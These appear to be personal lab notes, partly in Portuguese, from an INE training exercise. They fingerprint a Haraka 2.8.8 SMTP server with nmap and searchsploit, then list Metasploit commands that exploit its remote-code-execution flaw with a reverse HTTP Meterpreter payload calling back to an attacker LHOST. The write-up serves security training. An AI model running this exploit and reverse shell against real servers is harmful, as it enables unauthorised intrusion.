#+title: Vulnerable Smtp Server

* intro
In this lab, you will see how to fingerpint and exploit a vulnerable SMTP server using an appropriate Metasploit module to gain a shell on the target.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at demo.ine.local.

Objective: Your task is to fingerprint the application using command line tools available in Kali and then exploit the application using the appropriate Metasploit module. Get a shell on the target!

* initial scan
verificando o target do lab -->
#+begin_src sh
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.7        INE
127.0.0.1 AttackDefense-Kali
192.143.119.2   INE
192.143.119.2 INE
192.143.119.3 demo.ine.local
#+end_src

scan inicial no lab -->
#+begin_src sh
sudo nmap -sCV -p25 --script vuln -vv demo.ine.local

PORT   STATE SERVICE REASON         VERSION
25/tcp open  smtp    syn-ack ttl 64 Haraka smtpd 2.8.8
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
MAC Address: 02:42:C0:8F:77:03 (Unknown)
#+end_src

pesquisando sobre este smtp e sua versÃ£o -->
#+begin_src sh
searchsploit haraka 

Haraka < 2.8.9 - RCE
#+end_src

#+begin_src sh
msfconsole -q

use exploit/linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set rhost demo.ine.local
set LHOST 192.164.31.2
exploit
#+end_src
